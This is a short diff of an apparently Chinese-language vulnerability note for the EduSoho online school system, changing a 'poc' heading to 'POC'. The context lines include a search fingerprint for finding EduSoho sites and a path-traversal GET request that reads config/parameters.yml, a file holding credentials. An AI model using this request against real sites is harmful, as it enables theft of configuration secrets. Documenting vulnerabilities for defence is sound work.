@@ -8,7 +8,7 @@ EduSoho 教培系统是由杭州阔知网络科技研发的开源网校系统。
 body="Powered By EduSoho" || body="www.edusoho.com"
 ```
 
-## poc
+## POC
 
 ```
 GET /export/classroom-course-statistics?fileNames[]=../../../config/parameters.yml HTTP/1.1
